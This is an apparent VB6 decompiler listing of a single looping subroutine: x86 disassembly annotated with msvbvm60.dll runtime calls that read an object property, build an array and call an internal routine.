0086B3E1: push 008F2010h
0086B3E6: push 00433984h
0086B3EB: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086B3F0: mov var_000000C8, 008F2010h
0086B3FA: jmp 86B406h
0086B3FC: mov var_000000C8, 008F2010h
0086B406: push 00000000h
0086B408: push 00000004h
0086B40A: push 00440E58h
0086B40F: push 00000010h
0086B411: pop eax
0086B412: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B417: lea esi, var_70
0086B41A: mov edi, esp
0086B41C: movsd 
0086B41D: movsd 
0086B41E: movsd 
0086B41F: movsd 
0086B420: push 00000001h
0086B422: push 00000000h
0086B424: push 00440E48h
0086B429: push 00000000h
0086B42B: push 00000018h
0086B42D: mov eax, var_000000C8
0086B433: mov eax, [eax]
0086B435: mov ecx, var_000000C8
0086B43B: mov ecx, [ecx]
0086B43D: mov ecx, [ecx]
0086B43F: push eax
0086B440: call [ecx+00000550h]
0086B446: push eax
0086B447: lea eax, var_24
0086B44A: push eax
0086B44B: call 00410A84h ; Set (object)
0086B450: push eax
0086B451: lea eax, var_3C
0086B454: push eax
0086B455: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B45A: add esp, 00000010h
0086B45D: push eax
0086B45E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B463: push eax
0086B464: lea eax, var_28
0086B467: push eax
0086B468: call 00410A84h ; Set (object)
0086B46D: push eax
0086B46E: lea eax, var_4C
0086B471: push eax
0086B472: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B477: add esp, 00000020h
0086B47A: push eax
0086B47B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B480: push eax
0086B481: lea eax, var_2C
0086B484: push eax
0086B485: call 00410A84h ; Set (object)
0086B48A: push eax
0086B48B: lea eax, var_5C
0086B48E: push eax
0086B48F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B494: add esp, 00000010h
0086B497: push eax
0086B498: call 004108C8h ; msvbvm60.dll.__vbaBoolVar
0086B49D: sub ax, FFFFh
0086B4A1: neg ax
0086B4A4: sbb eax, eax
0086B4A6: inc eax
0086B4A7: neg eax
0086B4A9: mov var_0000009C, ax
0086B4B0: lea eax, var_2C
0086B4B3: push eax
0086B4B4: lea eax, var_28
0086B4B7: push eax
0086B4B8: lea eax, var_24
0086B4BB: push eax
0086B4BC: push 00000003h
0086B4BE: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086B4C3: add esp, 00000010h
0086B4C6: lea eax, var_5C
0086B4C9: push eax
0086B4CA: lea eax, var_4C
0086B4CD: push eax
0086B4CE: lea eax, var_3C
0086B4D1: push eax
0086B4D2: push 00000003h
0086B4D4: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086B4D9: add esp, 00000010h
0086B4DC: movsx eax, word ptr var_0000009C
0086B4E3: test eax, eax
0086B4E5: jz 0086B68Fh
0086B4EB: mov eax, var_18
0086B4EE: mov var_68, eax
0086B4F1: mov var_70, 00000003h
0086B4F8: cmp [008F2010h], 00000000h
0086B4FF: jnz 86B51Ch
0086B501: push 008F2010h
0086B506: push 00433984h
0086B50B: call 00410A4Eh ; msvbvm60.dll.__vbaNew2
0086B510: mov var_000000CC, 008F2010h
0086B51A: jmp 86B526h
0086B51C: mov var_000000CC, 008F2010h
0086B526: push 00000000h
0086B528: push 00000014h
0086B52A: push 00440E58h
0086B52F: push 00000010h
0086B531: pop eax
0086B532: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0086B537: lea esi, var_70
0086B53A: mov edi, esp
0086B53C: movsd 
0086B53D: movsd 
0086B53E: movsd 
0086B53F: movsd 
0086B540: push 00000001h
0086B542: push 00000000h
0086B544: push 00440E48h
0086B549: push 00000000h
0086B54B: push 00000018h
0086B54D: mov eax, var_000000CC
0086B553: mov eax, [eax]
0086B555: mov ecx, var_000000CC
0086B55B: mov ecx, [ecx]
0086B55D: mov ecx, [ecx]
0086B55F: push eax
0086B560: call [ecx+00000550h]
0086B566: push eax
0086B567: lea eax, var_24
0086B56A: push eax
0086B56B: call 00410A84h ; Set (object)
0086B570: push eax
0086B571: lea eax, var_3C
0086B574: push eax
0086B575: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B57A: add esp, 00000010h
0086B57D: push eax
0086B57E: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B583: push eax
0086B584: lea eax, var_28
0086B587: push eax
0086B588: call 00410A84h ; Set (object)
0086B58D: push eax
0086B58E: lea eax, var_4C
0086B591: push eax
0086B592: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B597: add esp, 00000020h
0086B59A: push eax
0086B59B: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
0086B5A0: push eax
0086B5A1: lea eax, var_2C
0086B5A4: push eax
0086B5A5: call 00410A84h ; Set (object)
0086B5AA: push eax
0086B5AB: lea eax, var_5C
0086B5AE: push eax
0086B5AF: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0086B5B4: add esp, 00000010h
0086B5B7: push eax
0086B5B8: call 004109FAh ; msvbvm60.dll.__vbaStrVarMove
0086B5BD: mov edx, eax
0086B5BF: lea ecx, var_1C
0086B5C2: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0086B5C7: push eax
0086B5C8: call 004109DCh ; Val(arg_1)
0086B5CD: fstp real8 ptr var_00000098
0086B5D3: push 00000000h
0086B5D5: push 00000000h
0086B5D7: push 00000001h
0086B5D9: push 00000000h
0086B5DB: lea eax, var_60
0086B5DE: push eax
0086B5DF: push 00000010h
0086B5E1: push 00000880h
0086B5E6: call 00410946h ; ReDim
0086B5EB: add esp, 0000001Ch
0086B5EE: mov var_00000088, 00442930h
0086B5F8: mov var_00000090, 00000008h
0086B602: lea esi, var_00000090
0086B608: push 00000000h
0086B60A: push var_60
0086B60D: call 0041093Ah ; msvbvm60.dll.__vbaDerefAry1
0086B612: mov ecx, eax
0086B614: mov edx, esi
0086B616: call 004108F2h ; msvbvm60.dll.__vbaVarCopy
0086B61B: mov edx, 0043D7C8h ; x79
0086B620: lea ecx, var_20
0086B623: call 00410A6Ch ; msvbvm60.dll.__vbaStrCopy
0086B628: lea eax, var_60
0086B62B: push eax
0086B62C: lea eax, var_20
0086B62F: push eax
0086B630: fld real8 ptr var_00000098
0086B636: call 004108E6h ; msvbvm60.dll.__vbaFpI2
0086B63B: push eax
0086B63C: call 007A6910h
0086B641: lea eax, var_60
0086B644: push eax
0086B645: push 00000000h
0086B647: call 00410934h ; Erase
0086B64C: lea eax, var_20
0086B64F: push eax
0086B650: lea eax, var_1C
0086B653: push eax
0086B654: push 00000002h
0086B656: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086B65B: add esp, 0000000Ch
0086B65E: lea eax, var_2C
0086B661: push eax
0086B662: lea eax, var_28
0086B665: push eax
0086B666: lea eax, var_24
0086B669: push eax
0086B66A: push 00000003h
0086B66C: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086B671: add esp, 00000010h
0086B674: lea eax, var_5C
0086B677: push eax
0086B678: lea eax, var_4C
0086B67B: push eax
0086B67C: lea eax, var_3C
0086B67F: push eax
0086B680: push 00000003h
0086B682: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086B687: add esp, 00000010h
0086B68A: call 0041096Ah ; DoEvents
0086B68F: jmp 0086B3AAh
0086B694: mov var_04, 00000000h
0086B69B: wait 
0086B69C: push 0086B6EEh
0086B6A1: jmp 86B6EDh
0086B6A3: lea eax, var_20
0086B6A6: push eax
0086B6A7: lea eax, var_1C
0086B6AA: push eax
0086B6AB: push 00000002h
0086B6AD: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
0086B6B2: add esp, 0000000Ch
0086B6B5: lea eax, var_2C
0086B6B8: push eax
0086B6B9: lea eax, var_28
0086B6BC: push eax
0086B6BD: lea eax, var_24
0086B6C0: push eax
0086B6C1: push 00000003h
0086B6C3: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0086B6C8: add esp, 00000010h
0086B6CB: lea eax, var_5C
0086B6CE: push eax
0086B6CF: lea eax, var_4C
0086B6D2: push eax
0086B6D3: lea eax, var_3C
0086B6D6: push eax
0086B6D7: push 00000003h
0086B6D9: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0086B6DE: add esp, 00000010h
0086B6E1: lea eax, var_60
0086B6E4: push eax
0086B6E5: push 00000000h
0086B6E7: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
0086B6EC: ret 
End Sub

